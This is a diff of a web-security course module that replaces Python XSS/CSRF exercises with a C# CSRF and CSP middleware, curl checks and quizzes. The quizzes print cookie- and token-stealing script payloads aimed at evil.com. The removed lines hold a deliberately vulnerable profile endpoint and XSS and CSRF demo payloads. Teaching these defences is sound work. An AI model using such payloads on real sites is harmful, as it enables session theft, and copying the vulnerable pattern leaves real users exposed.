+        private const string CsrfHeaderName = "X-CSRF-Token";
 
-### 2. Stored XSS — the dangerous one
+        public SecurityAndCsrfMiddleware(RequestDelegate next, bool isProduction)
+        {
+            _next = next;
+            _isProduction = isProduction;
+        }
 
-Add a comments feature: `POST /comment` saves the body, `GET /comments` renders
-all of them. Post `<script>document.title='pwned'</script>` as a comment, then
-load the page as a *different* user. Expected: the script runs for every viewer
-— demonstrating why stored XSS hits everyone, not just a link-clicker. Then fix
-it via template auto-escaping and confirm all viewers now see harmless text.
+        public async Task InvokeAsync(HttpContext context)
+        {
+            // 1. Generate Per-Request CSP Nonce
+            var nonceBytes = new byte[16];
+            RandomNumberGenerator.Fill(nonceBytes);
+            var cspNonce = Convert.ToBase64String(nonceBytes);
+            context.Items["CspNonce"] = cspNonce;
 
-### 3. Feel why `| safe` is a footgun
+            // 2. Manage CSRF Cookie
+            if (!context.Request.Cookies.TryGetValue(CsrfCookieName, out var csrfCookieToken) || 
+                string.IsNullOrEmpty(csrfCookieToken))
+            {
+                var tokenBytes = new byte[32];
+                RandomNumberGenerator.Fill(tokenBytes);
+                csrfCookieToken = Convert.ToHexString(tokenBytes);
 
-Take your fixed comment template and add `| safe` to the variable
-(`{{ comment | safe }}`). Reload with the stored payload. Expected: XSS is back —
-proving that `| safe` / `autoescape false` is exactly the switch that reopens
-the hole, and should only ever wrap content *you* generated.
+                context.Response.Cookies.Append(CsrfCookieName, csrfCookieToken, new CookieOptions
+                {
+                    Path = "/",
+                    Secure = _isProduction,
+                    SameSite = SameSiteMode.Lax,
+                    HttpOnly = false // Readable by client SPA
+                });
+            }
 
-### 4. Sanitize rich text instead of escaping it
+            // 3. Verify CSRF Token on Mutations
+            if (HttpMethods.IsPost(context.Request.Method) || 
+                HttpMethods.IsPut(context.Request.Method) || 
+                HttpMethods.IsDelete(context.Request.Method))
+            {
+                var submittedToken = context.Request.Headers[CsrfHeaderName].ToString();
+                
+                if (string.IsNullOrEmpty(submittedToken) || 
+                    !CryptographicCompare(submittedToken, csrfCookieToken))
+                {
+                    context.Response.StatusCode = StatusCodes.Status403Forbidden;
+                    await context.Response.WriteAsync("Forbidden: CSRF Verification Failed");
+                    return;
+                }
+            }
 
-Requirement change: comments may contain `<b>`, `<i>`, and links. You can't fully
-escape (kills the feature) and can't trust it. Run each comment through
-`nh3.clean()` before storing/rendering and post a payload mixing allowed tags
-with `<script>`, `onerror=`, and a `javascript:` link. Expected: bold/italic/
-links survive; the script, event handler, and `javascript:` URL are stripped.
+            // 4. Inject Strict Response Headers
+            context.Response.OnStarting(() =>
+            {
+                context.Response.Headers.Append("Content-Security-Policy", 
+                    $"default-src 'self'; script-src 'self' 'nonce-{cspNonce}'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';");
+                context.Response.Headers.Append("X-Content-Type-Options", "nosniff");
+                context.Response.Headers.Append("X-Frame-Options", "DENY");
+                return Task.CompletedTask;
+            });
 
-### 5. Add a Content-Security-Policy and watch it block a leak
+            await _next(context);
+        }
 
-Add the CSP middleware (`script-src 'self'`). Temporarily re-introduce a stored
-XSS (remove escaping) and reload. Expected: the browser console reports a CSP
-violation and the injected inline script is *blocked from executing* even though
-it's in the DOM — you've seen defense-in-depth catch a failure of the primary
-control. Then note what happens if you add `'unsafe-inline'` (protection gone).
+        // Constant-time comparison
+        private static bool CryptographicCompare(string a, string b)
+        {
+            var aBytes = Encoding.UTF8.GetBytes(a);
+            var bBytes = Encoding.UTF8.GetBytes(b);
+            return CryptographicOperations.FixedTimeEquals(aBytes, bBytes);
+        }
+    }
 
-### 6. DOM-based XSS — the server never sees it
+    // 5. Allowlist HTML Sanitizer using HtmlSanitizer
+    public static class HtmlSanitizationUtil
+    {
+        private static readonly HtmlSanitizer Sanitizer = new();
 
-Add a page with client JS that does
-`document.getElementById('out').innerHTML = location.hash.slice(1)`. Visit
-`page#<img src=x onerror=alert(1)>`. Expected: it fires, and your server logs
-show the payload *never reached the server* (it's after the `#`) — so server-side
-escaping is irrelevant. Fix it by using `textContent` instead of `innerHTML`.
+        static HtmlSanitizationUtil()
+        {
+            Sanitizer.AllowedTags.Clear();
+            Sanitizer.AllowedTags.Add("b");
+            Sanitizer.AllowedTags.Add("i");
+            Sanitizer.AllowedTags.Add("strong");
+            Sanitizer.AllowedTags.Add("a");
+            Sanitizer.AllowedAttributes.Clear();
+            Sanitizer.AllowedAttributes.Add("href");
+        }
 
-### 7. Perform a CSRF attack against your own app
-
-Ensure a state-changing cookie-authed endpoint exists (e.g. `POST
-/change-email`). Log in via the browser. From a *different origin* serve an
-`evil.html` with an auto-submitting form targeting that endpoint. Load it.
-Expected: the email changes — your session cookie was attached automatically,
-no token needed. This is CSRF, reproduced.
-
-### 8. Block the CSRF three ways
-
-Defend the endpoint from exercise 7: (a) set `SameSite=Lax` on the session
-cookie and replay the attack; (b) add a synchronizer CSRF token
-(`X-CSRF-Token`, compared with `compare_digest`) and replay; (c) confirm a
-legitimate same-origin request still works with the token. Expected: `SameSite`
-alone stops the forged POST, and the token stops it independently — defense in
-depth, either layer sufficient here but both kept.
-
-### 9. Diagnose and fix: the profile page
-
-Audit this feature (a JSON API storing a bio, plus a server-rendered profile
-page) for XSS and CSRF and fix everything.
-
-```python
-@app.post("/api/profile")                       # cookie-session authed
-async def save_profile(request: Request):
-    data = await request.json()
-    db.save_bio(current_user(request), data["bio"])      # stored verbatim
-    return {"ok": True}
-
-@app.get("/u/{name}", response_class=HTMLResponse)
-def profile_page(name: str):
-    bio = db.get_bio(name)
-    return f"<h1>{name}</h1><div class='bio'>{bio}</div>"   # hand-built HTML
+        public static string SanitizeUserMarkup(string untrustedHtml)
+        {
+            return Sanitizer.Sanitize(untrustedHtml);
+        }
+    }
+}
 ```
 
-<details>
-<summary>Solution</summary>
+---
 
-Flaws: (1) **Stored XSS** — `bio` (and `name`) are concatenated into HTML with
-no escaping, and the bio was stored verbatim, so `<script>` in a bio runs for
-every visitor. Fix: render via a Jinja2 template (`{{ name }}`, `{{ bio }}`) so
-both auto-escape; if the bio must allow rich text, `nh3.clean()` it (allowlist)
-on the way in/out instead. (2) **No CSP** — add `script-src 'self'` as a backstop
-so a future escaping slip doesn't execute. (3) **CSRF on `POST /api/profile`** —
-it's cookie-session authed and state-changing but has no CSRF protection, so
-`evil.com` can force a bio change; add `SameSite=Lax` on the session cookie *and*
-a synchronizer token (`X-CSRF-Token`, `compare_digest`). (Note: if this API were
-bearer-token authed it'd be CSRF-immune but you'd owe XSS extra care — the
-tradeoff.) Corrected shape: escape/sanitize on output, CSP header, `SameSite` +
-CSRF token on the state-changing route.
+## 5. Practical Hands-On Verification CLI Workflows
+
+### Step 1: Probe Cross-Site Request Forgery Rejection
+
+Simulate an unauthorized cross-origin request without the synchronizer token:
+
+```bash
+# 1. Simulate an unauthorized cross-origin POST request (Cookie provided by browser, header omitted)
+curl -s -w "\nHTTP Status: %{http_code}\n" -X POST "http://localhost:8080/api/profile/update" \
+  -H "Cookie: __Host-csrf-token=a9f4c3b88921e0b" \
+  -H "Content-Type: application/json" \
+  -d '{"email": "attacker@evil.com"}' | jq .
+```
+
+**Expected Wire Output:**
+```json
+{
+  "error": "Forbidden: Invalid CSRF Token"
+}
+HTTP Status: 403
+```
+
+---
+
+### Step 2: Verify Protected Mutation with Synchronizer Token
+
+```bash
+# 2. Simulate legitimate client echoing the cookie value into X-CSRF-Token header
+curl -s -w "\nHTTP Status: %{http_code}\n" -X POST "http://localhost:8080/api/profile/update" \
+  -H "Cookie: __Host-csrf-token=a9f4c3b88921e0b" \
+  -H "X-CSRF-Token: a9f4c3b88921e0b" \
+  -H "Content-Type: application/json" \
+  -d '{"email": "validuser@company.com"}' | jq .
+```
+
+**Expected Wire Output:**
+```json
+{
+  "success": true,
+  "updated_email": "validuser@company.com"
+}
+HTTP Status: 200
+```
+
+---
+
+### Step 3: Inspect Content Security Policy & Security Headers
+
+```bash
+curl -I "http://localhost:8080/dashboard"
+```
+
+**Expected Response Headers:**
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-t8yU4b...'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+```
+
+---
+
+## 6. Operational Validation Checkpoints (Scenario Quizzes)
+
+### Checkpoint 1: HttpOnly Cookies vs. CSRF Protection
+<details>
+<summary><strong>Scenario Assessment:</strong> A security auditor reports that a banking application lacks CSRF protection on its wire transfer endpoint. The developer responds: "All our session cookies are marked with `HttpOnly`, meaning JavaScript cannot read them, so cross-site attacks are impossible." Why is this defense incorrect?</summary>
+
+```
+Options:
+A) HttpOnly only works when the user uses Google Chrome or Firefox.
+B) HttpOnly prevents JavaScript from reading cookies (mitigating XSS token theft), but browsers still automatically attach HttpOnly cookies to cross-origin HTTP requests (leaving CSRF viable).
+C) HttpOnly cookies can be decrypted if the attacker uses an invalid SSL certificate.
+D) HttpOnly cookies are automatically converted into URL query parameters on POST requests.
+```
+
+**Answer:**
+**B is correct.** The `HttpOnly` flag dictates that client-side scripts (`document.cookie`) cannot read or manipulate the cookie value. This is a critical defense against XSS token exfiltration. However, `HttpOnly` does **nothing** to prevent CSRF. When a hostile site submits a cross-origin form to your domain, the victim's browser attaches all matching session cookies automatically, regardless of whether `HttpOnly` is enabled. CSRF requires explicit defenses: `SameSite` attributes and synchronizer tokens.
 
 </details>
 
-## Independent challenge
+---
 
-No code given. Build a small "public guestbook" for `sec-track`: any logged-in
-user can post a message (rich text allowed — bold, italics, links), and all
-messages render on a public page seen by everyone. Make it **XSS-safe** (decide
-per field: escape the plain fields, *sanitize* the rich-text field with an
-allowlist library, and add a CSP backstop) and **CSRF-safe** on the posting
-endpoint (`SameSite` + a synchronizer token, compared in constant time — reach
-back to **track 03 module 07**'s constant-time comparison, and **module 01** of
-this track's "validation ≠ the fix" reasoning applied to why you sanitize rather
-than blocklist). Then write a short note: classify the guestbook's XSS risk as
-reflected/stored/DOM and justify it, and explain the XSS↔CSRF tradeoff for your
-chosen auth model — which attack each credential type is *more* exposed to and
-why you still need both sets of defenses.
-
+### Checkpoint 2: The Limits of Content Security Policy
 <details>
-<summary>Hint</summary>
+<summary><strong>Scenario Assessment:</strong> A developer adds <code>Content-Security-Policy: script-src 'self' 'unsafe-inline'</code> to their site. An attacker submits a comment containing <code>&lt;script&gt;fetch('https://evil.com?c=' + document.cookie)&lt;/script&gt;</code>. Will the CSP header block execution?</summary>
 
-The design decision that carries this challenge is **escape vs sanitize, per
-field**: a username or title should be *escaped* (the user has no business
-sending markup, so turn it all to text), but the rich-text body must be
-*sanitized* (parsed, allowlisted down to `<b>/<i>/<a>`, everything else
-stripped) because escaping would destroy the feature and trusting it is XSS. Use
-a maintained allowlist sanitizer (`nh3`), never a regex blocklist — same lesson
-as module 01: content filtering by pattern is bypassable, structural/allowlist
-handling is not. The guestbook is **stored** XSS (messages are persisted and
-served to everyone), which is the worst kind because one payload hits every
-visitor including admins — so the CSP backstop and the sanitizer both earn their
-place as independent layers.
+```
+Options:
+A) Yes, because 'self' restricts all outbound network requests.
+B) Yes, because modern browsers reject script tags in comments automatically.
+C) No; including `'unsafe-inline'` explicitly instructs the browser to permit inline `<script>` tags and event handlers, neutralizing CSP's primary XSS defense.
+D) No, but the browser will encrypt the cookie before sending it to evil.com.
+```
+
+**Answer:**
+**C is correct.** The entire purpose of CSP for XSS prevention is to forbid the browser from parsing and executing inline `<script>` tags and inline event handlers (`onload`, `onerror`). By adding `'unsafe-inline'`, the developer explicitly disabled this restriction. To safely use CSP, remove `'unsafe-inline'` and use cryptographic nonces (`'nonce-...'`) or SHA-256 hashes for legitimate inline scripts.
 
 </details>
 
-## Common mistakes & troubleshooting
+---
 
-- **Building HTML by hand / `HTMLResponse(f"...{user}...")`.** No escaping =
-  XSS. Render through an auto-escaping template engine (Jinja2) instead.
-- **Using `| safe` / `autoescape false` / `dangerouslySetInnerHTML` on
-  untrusted data.** That switch *is* the vulnerability. Only ever wrap content
-  you generated yourself.
-- **Sanitizing with a regex/blocklist.** Endless bypasses
-  (`<svg onload>`, encodings). Use an allowlist sanitizer library (`nh3`).
-- **Escaping when you should sanitize (or vice versa).** Escape when no markup is
-  allowed; sanitize (allowlist) only where rich text is a real requirement.
-- **Treating CSP as a replacement for escaping.** CSP is a backstop; escaping is
-  the fix. And `'unsafe-inline'` in `script-src` defeats most of CSP's XSS value.
-- **Forgetting DOM XSS.** Server-side escaping can't help when client JS writes
-  untrusted input into `innerHTML`. Use `textContent`/safe sinks in the frontend.
-- **Relying on `SameSite` alone for CSRF.** Good first line; add a synchronizer
-  token for state-changing cookie-authed requests (older browsers, `Lax` GET
-  gaps).
-- **A state-changing GET endpoint.** CSRF-friendly and cache/log-leaky. Mutations
-  are POST/PUT/DELETE, and still need CSRF protection.
-- **Comparing the CSRF token with `==`.** Timing side-channel (track 03 m07). Use
-  `secrets.compare_digest`.
-
-## Checkpoint quiz
-
-Write down your answer to each question before expanding it — checking without attempting first is the single easiest way to fool yourself into thinking you've learned this.
-
-1. Define reflected, stored, and DOM-based XSS by *where the payload lives*, and
-   say which is usually most dangerous and why.
-2. What is context-aware output encoding, and why can't you use one escaping
-   function everywhere?
-3. When do you *sanitize* HTML instead of *escaping* it, and why must you use an
-   allowlist library rather than a regex?
-4. What does a Content-Security-Policy do for XSS, why is it not a replacement
-   for escaping, and what does `'unsafe-inline'` do to it?
-5. Explain the CSRF mechanism and why it threatens cookie/session auth but
-   largely spares bearer-token APIs.
-6. Name three CSRF defenses and how each stops the forged request.
-7. State the XSS↔CSRF tradeoff between cookie-session and bearer-token auth.
-
+### Checkpoint 3: The Bearer Token vs. Cookie Auth Tradeoff
 <details>
-<summary>Answers</summary>
+<summary><strong>Scenario Assessment:</strong> An engineering team migrates their Single Page Application (SPA) from cookie-based sessions to Bearer JWTs stored in browser <code>localStorage</code>. A senior engineer notes that while CSRF risk is eliminated, another security risk is heightened. What is that risk and why?</summary>
 
-1. **Reflected** — payload is in the request and echoed into the immediate
-   response (crafted link, fires per victim). **Stored** — payload is persisted
-   (comment/bio) and served to everyone who views it later. **DOM** — injection
-   happens in client JS writing untrusted input into a dangerous sink; the
-   server never sees it. Stored is usually worst: one payload hits every viewer,
-   including admins, with no crafted link.
-2. Encoding untrusted data for the *specific context* it lands in (HTML body,
-   attribute, JS string, URL), because each context has different significant
-   characters and escaping rules — HTML-entity encoding doesn't neutralize a
-   `javascript:` URL or a JS-string breakout, so the wrong encoder leaves a
-   hole. Auto-escaping template engines handle the common HTML-body case.
-3. Sanitize when the feature *requires* allowing some HTML (rich text); escaping
-   would destroy the markup and trusting it is XSS. Use an allowlist library
-   (`nh3`) that keeps only known-safe tags/attrs — a regex blocklist is
-   bypassable (`<svg onload>`, encodings), same losing game as module 01.
-4. CSP tells the browser which script sources may execute, so an injected inline
-   or off-origin script is blocked even if escaping failed — a defense-in-depth
-   backstop, not the fix (escaping is). `'unsafe-inline'` re-permits inline
-   scripts/handlers, which is what most XSS payloads are, gutting the protection.
-5. A malicious page makes the victim's browser send a state-changing request to
-   your origin; the browser auto-attaches the session cookie, so the server sees
-   a valid session and acts. Bearer-token APIs require the client to explicitly
-   set `Authorization`, which a cross-site page can't do, so they're largely
-   immune.
-6. **`SameSite=Lax/Strict`** — browser won't attach the cookie on cross-site
-   subrequests. **Synchronizer token** — unpredictable per-session token echoed
-   in a header; the attacker's site can't read it (same-origin policy), so can't
-   forge it. **Double-submit cookie** — token sent as both cookie and header,
-   server checks they match (stateless, weaker, pair with `SameSite`).
-7. Cookie-session auth is the CSRF target (auto-attached) but resists XSS token
-   theft when `HttpOnly`; bearer tokens dodge CSRF (not auto-attached) but are
-   the XSS exfiltration target if stored where JS can read them. No single
-   choice is safe against both — layer `HttpOnly`+`SameSite`+CSRF tokens+
-   escaping+CSP.
+```
+Options:
+A) SQL injection risk increases because JWTs cannot be parameterized.
+B) The application becomes highly vulnerable to catastrophic token exfiltration via any XSS bug, because JavaScript running in the origin can trivially access `localStorage.getItem()`.
+C) The server cannot verify JWT signatures without contacting a remote LDAP server.
+D) The browser disables HTTPS encryption when tokens are present in LocalStorage.
+```
+
+**Answer:**
+**B is correct.** Bearer tokens do eliminate CSRF because browsers never automatically attach custom `Authorization: Bearer` headers to cross-origin requests. However, storing bearer tokens in `localStorage` or `sessionStorage` makes them universally accessible to any JavaScript running on that origin. If a single XSS vulnerability exists anywhere on the site, an attacker can read and exfiltrate the token with a single line of code (`new Image().src = "http://evil.com?t=" + localStorage.getItem("jwt")`).
 
 </details>
 
-## Cumulative review
+---
 
-Closed-book. Don't reopen modules 00-02 while attempting these.
+## 7. Cumulative Review: Modules 00–02 (Closed-Book Self Assessment)
 
-1. State module 00's single unifying model of the Top 10, then place SQL
-   injection (module 01), stored XSS (module 02), and CSRF (module 02) on it:
-   for each, name the trust boundary crossed and the interpreter/mechanism
-   abused.
-2. Both SQLi and XSS are "injection." Explain what they share (root cause) and
-   how their *fixes* differ, and why the difference exists.
-3. A teammate says "we validate and strip dangerous characters from all input,
-   so we're safe from SQLi and XSS." Give the specific reason this is
-   insufficient for *each*, and state the correct primary fix for each.
-4. For a cookie-session browser app, you must stop both XSS session-theft and
-   CSRF. List the specific controls for each and explain why `HttpOnly` helps one
-   but does nothing for the other.
-5. Rank *these three* by blast radius and justify: a reflected XSS on a search
-   page, a stored XSS in the admin-visible comments feed, and a SQL injection in
-   a `/search?q=` that runs as a least-privilege read-only DB user.
-6. "We switched from cookies to bearer tokens, so we don't need CSRF protection
-   anymore — are we more secure overall?" Answer with the tradeoff and one new
-   obligation the switch creates.
-7. Apply module 00's "frontend is not a control" principle to module 01 and
-   module 02: give one concrete way each vulnerability is reachable even though
-   the UI never offers the malicious input.
+Test your retention of foundational application security principles before moving forward:
 
-<details>
-<summary>Answers</summary>
+1. **The Unifying Trust Boundary Model**: What single failure underlies SQL injection (Module 01), Stored XSS (Module 02), and CSRF (Module 02)?
+2. **Context-Specific Neutralization**: Why can't we use SQL prepared statements to stop XSS, and why can't we use HTML entity escaping to stop SQL injection?
+3. **Defense-in-Depth for State Mutations**: For an enterprise banking application using cookie sessions, list the four independent defensive layers required to ensure complete resilience against XSS and CSRF.
+4. **The Timing Side-Channel**: Why must anti-CSRF token verification use constant-time byte comparisons (`secrets.compare_digest` / `timingSafeEqual`) instead of standard string equality (`==`)?
 
-1. Model: **untrusted input crossing a trust boundary into an interpreter that
-   treats it as more than data.** SQLi: request input crosses into the SQL
-   interpreter, parsed as query structure/code. Stored XSS: input crosses in
-   (stored), then out into the browser's HTML parser, parsed as markup/script.
-   CSRF: the boundary is the *browser's auto-cookie-attachment* — a cross-site
-   request crosses into your app carrying the victim's session, abusing the
-   browser's ambient authority (not code injection, but the same "trusting
-   something you shouldn't" theme).
-2. Shared root cause: untrusted data concatenated onto a command channel so the
-   interpreter parses it as code. Fixes differ because the interpreters differ:
-   SQLi → **parameterize** (send code and data on separate channels to the DB
-   driver); XSS → **output-encode/escape** for the browser's HTML context (or
-   sanitize for rich text). You can't "parameterize" HTML the way you do SQL,
-   and you can't "escape" your way to safe SQL structure — the neutralization is
-   context-specific.
-3. SQLi: character blocklists are bypassable (encodings, alternate syntax) and
-   break real data (O'Brien); primary fix is **parameterized queries** (+ allow-
-   list identifiers). XSS: same bypass problem plus you often *need* some markup;
-   primary fix is **context-aware output encoding** (+ allowlist sanitization for
-   rich text, CSP backstop). Validation is defense in depth, not the fix, for
-   both.
-4. XSS theft: `HttpOnly` cookie (JS can't read it) + output escaping + CSP.
-   CSRF: `SameSite` cookie + synchronizer CSRF token. `HttpOnly` stops script
-   from *reading/stealing* the cookie (XSS) but does nothing for CSRF, because
-   CSRF never reads the cookie — the browser *attaches it automatically* on the
-   forged request regardless of `HttpOnly`.
-5. Stored XSS in an admin-visible feed is worst — it runs script in an admin's
-   authenticated session (privilege escalation) and hits every viewer. SQLi even
-   on a read-only least-privilege user is next — it can still read arbitrary
-   readable data (exfiltration) but can't `DROP`/write (blast radius capped by
-   least privilege). Reflected XSS on search is narrowest — fires only for a
-   victim tricked into opening a crafted link.
-6. You *are* largely CSRF-immune now (bearer tokens aren't auto-attached), so
-   that specific risk drops — but the new obligation is **XSS discipline**: a
-   bearer token in JS-reachable storage is exfiltrated by one injected line, so
-   you now owe strict output encoding, CSP, and ideally not storing the token
-   where JS can read it. Net security depends on how well you meet that
-   obligation — it's a tradeoff, not a free win.
-7. SQLi: the UI's search box may cap length or restrict characters, but an
-   attacker `curl`s `/search?q=' OR '1'='1` directly — the constraint was only
-   client-side. XSS/CSRF: the comment form may sanitize in JS before submit, but
-   an attacker POSTs the raw `<script>` payload straight to the API; and a CSRF
-   attack never uses your UI at all — it's a form on `evil.com`. All controls
-   must be server-side.
+---
 
-</details>
+## 8. Further Reading & Sources
 
-## Further reading & sources
+- [OWASP Cross Site Scripting (XSS) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [OWASP Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [MDN Web Docs: Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+- [MDN Web Docs: Using HTTP Cookies & SameSite Attributes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
+- [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
 
-- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) - context-aware output encoding rules for each injection context.
-- [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) - synchronizer tokens, double-submit, and `SameSite` in depth.
-- [MDN - Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) - how the browser enforces script sources and why `'unsafe-inline'` guts it.
-- [MDN - SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) - the cookie attribute that blocks cross-site cookie attachment.
-- [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) - safe DOM sinks for the client-only variant your server never sees.
-- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html) - the formal weakness definition (see CWE-352 for CSRF).
+---
 
-## Next
+## Next Steps
 
-[03-ssrf-and-deserialization-attacks](../03-ssrf-and-deserialization-attacks/README.md)
-— two attacks that turn *your own server's trust* against you: SSRF (you fetch a
-URL the attacker chose, reaching internal services and cloud metadata) and
-insecure deserialization (you rebuild objects from untrusted bytes — Python's
-`pickle` being a direct path to remote code execution).
+Now that both server-side command parsers and client-side browser DOM parsers are protected, we examine vulnerabilities that turn your own server's outbound network authority and object unmarshallers against you:
+
+- Next Module: **[03-ssrf-and-deserialization-attacks](../03-ssrf-and-deserialization-attacks/README.md)** (Server-Side Request Forgery, Cloud Metadata Protection, and Insecure Object Deserialization).
+- Track Index: [README.md](../README.md)
